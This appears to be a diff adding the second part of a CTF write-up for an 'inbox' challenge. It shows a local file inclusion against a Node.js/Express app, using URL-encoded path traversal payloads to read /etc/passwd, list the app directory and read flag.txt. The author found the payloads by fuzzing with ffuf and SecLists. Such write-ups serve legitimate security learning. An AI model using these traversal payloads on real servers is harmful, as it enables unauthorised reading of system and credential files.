@@ -53,3 +53,54 @@ output: see picture below
 ![](../images/inbox6.png)
 we get the fist part of the flag:
 #  flag{off_to_a_good_start_
+/
+#end of part one
+#know we need to hunt the second part of the flag. are you ready? let go
+after clicking on [- flag{off_to_a_good_start_] from the previous page we got, we get this page:
+![](../images/inbox7.png)\\\
+the backend code try to include 'flag{off_to_a_good_start_' file from './mail' directory.
+let me say that the website use 
+# node js, express as backend
+so we need to make local file inclusion in order to read files from the server.
+after make some test and gest nothing, i use **ffuf**  and **seclist** to fuzz for valide payload.
+see this image:
+![](../images/inbox8.png) \\
+so payload like this can work: ..%2F..%2F..%2F%2F..%2F..%2Fetc/passwd
+![](../images/inbox9.png) 
+we read /etc/passwd flag.\\
+by exploiting this vunl, we can list the content of all directory on the server. 
+payload like this: ..%2F..%2F..%2F%2F..%2F..%2
+# list the content of / directory
+
+payload: https://thecybercoopctf-inbox.chals.io/mail/..%2F..%2F..%2F%2F..%2F..%2Fusr%2fsrc%2fapp
+output:
+'''
+Emails
+
+flag.txt
+
+inbox.db
+
+index.js
+
+mail
+
+migrations.sql
+
+node_modules
+
+package-lock.json
+
+package.json
+
+views
+'''
+with this payload: we read the content of: /usr/src/app
+and we see that we have the flag.txt file on it. so let read the content of this file.
+payload: **https://thecybercoopctf-inbox.chals.io/mail/..%2F..%2F..%2F%2F..%2F..%2Fusr%2fsrc%2fapp/flag.txt**
+output: see image below.
+![](../images/inbox11.png) 
+
+so we get the last part of the flag
+# even_better_finish_though}
+# the final flag ist: flag{off_to_a_good_start_even_better_finish_though}
